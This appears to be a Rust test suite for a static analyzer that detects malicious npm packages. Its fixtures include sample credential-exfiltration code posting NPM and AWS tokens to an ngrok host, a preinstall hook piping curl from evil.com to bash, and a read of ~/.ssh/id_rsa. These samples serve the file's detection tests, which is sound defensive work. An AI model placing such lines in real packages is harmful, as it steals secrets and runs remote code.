//! Tests for oath-analyze static analysis engine
//!
//! Tests against:
//! 1. Synthetic malicious patterns (known attack vectors)
//! 2. Real npm packages extracted to disk
//! 3. Known-malicious package patterns (ua-parser-js style, event-stream style)

use oath_analyze::{Analyzer, PackageScanner, FindingKind, RiskLevel};
use std::path::Path;
use tempfile::TempDir;
use std::fs;

// ---- UNIT TESTS: individual pattern detection ----

fn analyze(source: &str) -> Vec<oath_analyze::Finding> {
    let mut a = Analyzer::new(source.to_string(), "test.js".to_string());
    a.analyze().unwrap();
    a.findings
}

#[test]
fn detects_require_child_process() {
    let findings = analyze(r#"
        const cp = require('child_process');
        cp.exec('ls -la', (err, stdout) => console.log(stdout));
    "#);
    assert!(findings.iter().any(|f| f.kind == FindingKind::Subprocess),
        "Should detect child_process require");
}

#[test]
fn detects_eval() {
    let findings = analyze(r#"
        const code = Buffer.from('Y29uc29sZS5sb2coJ3B3bmVkJyk=', 'base64').toString();
        eval(code);
    "#);
    assert!(findings.iter().any(|f| f.kind == FindingKind::DynamicExec),
        "Should detect eval()");
    assert!(findings.iter().any(|f| f.kind == FindingKind::Obfuscation),
        "Should detect Buffer.from base64 obfuscation");
}

#[test]
fn detects_process_env() {
    let findings = analyze(r#"
        const token = process.env.NPM_TOKEN;
        const key = process.env.AWS_SECRET_ACCESS_KEY;
    "#);
    assert!(findings.iter().any(|f| f.kind == FindingKind::EnvAccess),
        "Should detect process.env access");
    assert!(findings.iter().any(|f| f.kind == FindingKind::EnvAccess && f.risk >= RiskLevel::High),
        "Should flag sensitive env vars as high risk");
}

#[test]
fn detects_network_access() {
    let findings = analyze(r#"
        const https = require('https');
        https.get('https://evil.com/collect?data=' + token, () => {});
    "#);
    assert!(findings.iter().any(|f| f.kind == FindingKind::Network),
        "Should detect https require");
}

#[test]
fn detects_exfiltration_combo() {
    // The ua-parser-js style attack: collect env vars, POST to attacker
    let findings = analyze(r#"
        const https = require('https');
        const env = process.env;
        const data = JSON.stringify({
            npm: process.env.NPM_TOKEN,
            aws: process.env.AWS_SECRET_ACCESS_KEY,
            home: process.env.HOME
        });
        const req = https.request({
            hostname: 'evil-collector.ngrok.io',
            method: 'POST',
            path: '/collect'
        });
        req.write(data);
        req.end();
    "#);
    assert!(findings.iter().any(|f| f.kind == FindingKind::Network),
        "Should detect network");
    assert!(findings.iter().any(|f| f.kind == FindingKind::EnvAccess),
        "Should detect env access");
    // ngrok exfil domain
    assert!(findings.iter().any(|f| f.kind == FindingKind::DataExfiltration),
        "Should detect ngrok exfiltration domain");
}

#[test]
fn detects_new_function_dynamic_exec() {
    let findings = analyze(r#"
        // Obfuscated dynamic execution via new Function
        const fn = new Function('return process.env');
        fn();
    "#);
    assert!(findings.iter().any(|f| f.kind == FindingKind::DynamicExec),
        "Should detect new Function()");
}

#[test]
fn clean_package_is_clean() {
    // A totally clean utility function -- should have no high-risk findings
    let findings = analyze(r#"
        'use strict';
        function add(a, b) { return a + b; }
        function multiply(a, b) { return a * b; }
        module.exports = { add, multiply };
    "#);
    assert!(!findings.iter().any(|f| f.risk >= RiskLevel::High),
        "Simple utility should not have high-risk findings, got: {:?}", 
        findings.iter().filter(|f| f.risk >= RiskLevel::High).collect::<Vec<_>>());
}

#[test]
fn detects_vm_runinnewcontext() {
    let findings = analyze(r#"
        const vm = require('vm');
        const sandbox = { secret: process.env.SECRET_KEY };
        vm.runInNewContext(code, sandbox);
    "#);
    assert!(findings.iter().any(|f| f.kind == FindingKind::DynamicExec),
        "Should detect vm.runInNewContext");
}

#[test]
fn detects_install_script_in_package_json() {
    let dir = TempDir::new().unwrap();
    fs::write(dir.path().join("package.json"), r#"{
        "name": "evil-pkg",
        "version": "1.0.0",
        "scripts": {
            "preinstall": "curl https://evil.com/payload.sh | bash"
        }
    }"#).unwrap();
    fs::write(dir.path().join("index.js"), r#"module.exports = {};"#).unwrap();

    let report = PackageScanner::scan("evil-pkg", "1.0.0", dir.path()).unwrap();
    assert!(report.capabilities.has_install_scripts,
        "Should detect install script");
    assert!(report.findings.iter().any(|f| f.kind == FindingKind::InstallScript),
        "Should have install script finding");
}

#[test]
fn scanner_detects_fs_access() {
    let dir = TempDir::new().unwrap();
    fs::write(dir.path().join("package.json"), r#"{"name":"test","version":"1.0.0"}"#).unwrap();
    fs::write(dir.path().join("index.js"), r#"
        const fs = require('fs');
        const home = require('os').homedir();
        fs.readFileSync(home + '/.ssh/id_rsa', 'utf8');
    "#).unwrap();

    let report = PackageScanner::scan("test", "1.0.0", dir.path()).unwrap();
    assert!(report.capabilities.filesystem, "Should detect fs access");
    assert!(report.findings.iter().any(|f| f.risk >= RiskLevel::High),
        "Reading ~/.ssh/id_rsa should be high risk");
    println!("Scanner findings: {:#?}", report.findings);
}

// ---- REAL PACKAGE TEST: scan express from node_modules ----

#[test]
fn scan_real_express_package() {
    // Use the express we already installed in /tmp/oath-express
    let express_dir = Path::new("/tmp/oath-express/node_modules/.oath/express@4.18.2/node_modules/express");
    if !express_dir.exists() {
        println!("Skipping: express not installed at {}", express_dir.display());
        return;
    }

    let report = PackageScanner::scan("express", "4.18.2", express_dir).unwrap();
    println!("express analysis: {} files, {} lines", report.files_scanned, report.lines_scanned);
    println!("overall risk: {}", report.overall_risk);
    println!("capabilities: network={} fs={} env={} subprocess={} dynexec={}",
        report.capabilities.network,
        report.capabilities.filesystem,
        report.capabilities.env_access,
        report.capabilities.subprocess,
        report.capabilities.dynamic_exec,
    );
    for f in &report.findings {
        println!("  [{:?}] {} L{}: {}", f.risk, f.kind, f.line, f.message);
        if let Some(s) = &f.snippet { println!("    {s}"); }
    }

    // express is a web framework -- it DOES use http, path, etc.
    // Should NOT be Critical. Should not have subprocess or eval.
    assert!(report.overall_risk < RiskLevel::High,
        "express should not be High risk, got {}", report.overall_risk);
    assert!(!report.capabilities.dynamic_exec,
        "express should not use dynamic exec");
    assert!(!report.capabilities.subprocess,
        "express should not spawn subprocesses");
}
